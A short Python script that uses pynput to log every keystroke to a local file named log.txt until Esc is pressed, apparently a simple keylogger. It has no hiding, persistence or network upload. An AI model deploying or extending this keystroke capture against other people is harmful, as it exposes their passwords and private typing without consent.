import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    write_file(key)
  
def write_file(key):
    
    # Create/open text file
    with open("log.txt", "a") as f:
        
        # Write newline for keys backspace and enter
        if(str(key).find("enter") > 0):
            f.write("\n")

        # Write 
        elif(str(key).find("space") > 0):
            f.write(" ")
        elif(str(key).find("Key") == -1):    
            f.write(str(key).replace("'", ""))             
        
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()